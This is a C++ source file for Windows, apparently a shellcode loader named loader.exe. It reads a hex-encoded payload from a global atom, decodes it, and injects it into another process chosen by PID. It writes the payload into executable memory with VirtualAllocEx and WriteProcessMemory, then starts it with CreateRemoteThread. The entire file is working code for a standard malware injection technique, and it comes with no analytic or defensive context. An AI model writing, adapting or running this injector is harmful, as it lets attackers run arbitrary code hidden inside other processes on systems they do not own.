#include <windows.h>
#include <iostream>
#include <string>

std::string GetAtomData(ATOM atom) {
    char buffer[256];
    UINT len = GlobalGetAtomNameA(atom, buffer, sizeof(buffer));
    if (len == 0) {
        std::cerr << "GlobalGetAtomNameA failed: " << GetLastError() << std::endl;
        return "";
    }
    return std::string(buffer, len);
}

void InjectShellcode(DWORD pid, ATOM atom) {
    // Get atom content (hex string)
    std::string hexShellcode = GetAtomData(atom);
    if (hexShellcode.empty()) return;

    size_t shellcodeLen = hexShellcode.length() / 2;
    BYTE* shellcode = new BYTE[shellcodeLen];

    for (size_t i = 0; i < shellcodeLen; i++) {
        std::string byteStr = hexShellcode.substr(i * 2, 2);
        shellcode[i] = static_cast<BYTE>(strtoul(byteStr.c_str(), NULL, 16));
    }

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        delete[] shellcode;
        return;
    }

    // Allocate memory
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        delete[] shellcode;
        return;
    }

    // Write shellcode
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeLen, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        delete[] shellcode;
        return;
    }

    // Execute
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
    } else {
        std::cout << "Shellcode injected and thread started." << std::endl;
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    delete[] shellcode;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: loader.exe <PID> <AtomID>" << std::endl;
        return 1;
    }

    DWORD pid = std::stoul(argv[1]);
    ATOM atom = static_cast<ATOM>(std::stoi(argv[2]));

    InjectShellcode(pid, atom);
    return 0;
}
